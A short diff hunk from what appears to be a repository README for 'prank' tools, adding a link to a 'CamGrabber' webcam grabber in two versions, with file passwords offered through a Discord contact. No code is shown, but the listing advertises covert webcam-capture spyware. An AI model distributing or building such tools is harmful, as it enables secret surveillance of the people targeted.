@@ -38,7 +38,7 @@ u can use this to prank your friends
 
 # Webcam Grabber:
 
-- [soon]
+- CamGrabber: [CamGrabber(2 Versions)](https://github.com/Xan0GDI/Xan0/tree/main/CamGrabber)
 
 if you want the passwords to the files send me a friend request on discord `.xrxx.v2`
 
